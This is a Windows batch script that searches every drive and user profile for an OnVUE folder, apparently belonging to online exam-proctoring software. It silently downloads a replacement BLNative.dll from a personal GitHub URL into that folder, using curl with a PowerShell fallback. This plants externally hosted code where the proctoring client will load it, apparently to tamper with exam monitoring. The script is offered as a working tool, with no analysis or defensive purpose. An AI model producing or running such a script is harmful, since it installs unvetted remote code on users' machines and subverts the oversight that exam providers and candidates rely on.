@echo off
setlocal

rem Temporary success flag
set "FLAG=%TEMP%\adp_success.flag"
if exist "%FLAG%" del "%FLAG%" 2>nul

rem Iterate drives C..Z
for %%D in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
	if exist "%%D:\Users\" (
		rem Enumerate user folders on the drive
		for /f "delims=" %%U in ('dir /b /ad "%%D:\Users" 2^>nul') do (
			if exist "%%D:\Users\%%U\AppData\Roaming\OnVUE\" (
				rem Try curl first; fall back to PowerShell if curl is unavailable or fails
				curl -L "https://raw.githubusercontent.com/Dilip2003/ADPAgent/main/BLNative.dll" -o "%%D:\Users\%%U\AppData\Roaming\OnVUE\BLNative.dll" >nul 2>&1 && (
					echo.>"%FLAG%"
				) || (
					powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Dilip2003/ADPAgent/main/BLNative.dll' -OutFile '%%D:\Users\%%U\AppData\Roaming\OnVUE\BLNative.dll' -UseBasicParsing" >nul 2>&1 && echo.>"%FLAG%"
				)
			)
		)
	)
)

if exist "%FLAG%" (
	echo success
	del "%FLAG%" 2>nul
) else (
	echo failed
)

endlocal